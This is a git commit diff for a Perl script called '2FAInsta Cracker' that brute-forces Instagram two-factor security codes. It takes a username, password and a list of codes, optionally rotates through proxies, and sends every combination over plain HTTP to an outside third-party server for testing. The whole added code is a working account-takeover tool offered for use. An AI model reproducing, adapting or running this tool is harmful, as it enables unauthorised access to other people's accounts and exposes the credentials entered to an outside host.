41cc9824724e8247c58cecf4c5751fd1a8dccd95
1337r00t <u9cc85@gmail.com>
2017-07-23 20:14:18 +0300

    Updated Tool (#bug 1)

--- Cracker.pl
+++ Cracker.pl
@@ -14,31 +14,89 @@ print '
 ...........................................................................
 \n';
 print qq(
-Enter MID :
-> );
-$mid=<STDIN>;
-chomp($mid);
+#============================#
+#     2FAInsta Cracker       #
+#     C0ded by 1337r00t      #
+#    Instagram: 1337r00t     #
+#============================#\n
+\n1 - With Proxy\n2 - Without Proxy\n\n> );
+$do = <STDIN>;
+chomp($do);
+system('cls');
+#######################################################################################
+if ($do == 1){
+	print qq(
+	Enter Proxys File:
+	> );
+	$proxylist=<STDIN>;
+	chomp($proxylist);
+	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
+	@PROXYS = <PROXYFILE>;
+	close PROXYFILE;
+	
+	print qq(
+	Enter Username :
+	> );
+	$user=<STDIN>;
+	chomp($user);
+	
+	print qq(
+	Enter Password :
+	> );
+	$pass=<STDIN>;
+	chomp($pass);
+	
+	print qq(
+	Enter Security Codes File:
+	> );
+	$codelist=<STDIN>;
+	chomp($codelist);
+	open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
+	@CODES = <CODEFILE>;
+	close CODEFILE;
+	######################
+	foreach $code (@CODES) {
+	chomp $code;
+		foreach $proxy (@PROXYS) {
+		chomp $proxy;
+			$ua = LWP::UserAgent->new();
+			$request = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/instagram/proxy.php?proxy=$proxy&user=$user&pass=$pass&code=$code");
+			$response = $ua->request($request);
+			$output = $response->content();
+			print "$output\n";
+		}
+	}
+}
+##################################################################################
+if ($do == 2){
 
 print qq(
-Enter URL :
+Enter Username :
 > );
-$url=<STDIN>;
-chomp($url);
+$user2=<STDIN>;
+chomp($user2);
+
+print qq(
+Enter Password :
+> );
+$pass2=<STDIN>;
+chomp($pass2);
 
 print qq(
 Enter Security Codes File:
 > );
-$codelist=<STDIN>;
-chomp($codelist);
-open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
-@CODES = <CODEFILE>;
-close CODEFILE;
+$codelist2=<STDIN>;
+chomp($codelist2);
+open (CODEFILE2, "<$codelist2") || die "[-] Can't Found The List Of Codes !";
+@CODES2 = <CODEFILE2>;
+close CODEFILE2;
 ######################
-foreach $code (@CODES) {
-chomp $code;
-	$ua = LWP::UserAgent->new();
-	$request = HTTP::Request->new(GET => "http://localhost/instagram.php?url=$url&mid=$mid&code=$code"); # Upload /src/Instagram.php
-	$response = $ua->request($request);
-	$output = $response->content();
-	print "$output\n";
+foreach $code2 (@CODES2) {
+chomp $code2;
+	$ua2 = LWP::UserAgent->new();
+	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/instagram/normal.php?user=$user2&pass=$pass2&code=$code2");
+	$response2 = $ua2->request($request2);
+	$output2 = $response2->content();
+	print "$output2\n";
+}
 }
